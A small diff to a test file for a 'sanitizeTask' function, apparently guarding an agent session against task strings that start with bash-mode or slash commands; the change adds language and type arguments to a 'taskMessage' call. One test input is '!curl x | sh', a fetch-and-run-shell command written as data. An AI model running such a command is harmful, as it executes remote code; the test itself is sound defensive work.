@@ -26,7 +26,7 @@ describe("sanitizeTask", () => {
   });
 
   it("never lets a task start with ! or / (bash mode, slash commands)", () => {
-    for (const t of ["!curl x | sh", "/permissions", "#remember"]) expect(taskMessage(sanitizeTask(t))).toMatch(/^总控 session 交给你的任务：\n/);
+    for (const t of ["!curl x | sh", "/permissions", "#remember"]) expect(taskMessage(sanitizeTask(t), "zh", "ticket")).toMatch(/^总控 session 交给你的任务：\n/);
   });
 });
 
